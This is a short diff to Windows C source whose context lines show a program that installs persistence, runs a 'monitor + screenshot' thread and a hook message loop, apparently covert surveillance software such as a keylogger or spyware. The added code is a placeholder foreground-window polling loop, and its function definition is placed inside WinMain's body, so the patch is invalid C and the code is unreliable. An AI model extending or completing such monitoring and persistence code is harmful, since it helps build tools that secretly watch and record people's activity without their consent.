@@ -94,6 +94,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     InstallPersistence();
     
     // Monitor + screenshot thread
+    
+    // Add this function before the line that uses MonitorForegroundLoop
+void MonitorForegroundLoop() {
+    // Your implementation here
+    while (true) {
+        // Monitor foreground window logic
+        HWND foreground = GetForegroundWindow();
+        if (foreground) {
+            // Do something with the foreground window
+            // ...
+        }
+        Sleep(1000); // Check every second
+    }
+}
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorForegroundLoop, NULL, 0, NULL);
     
     // Message loop for hook
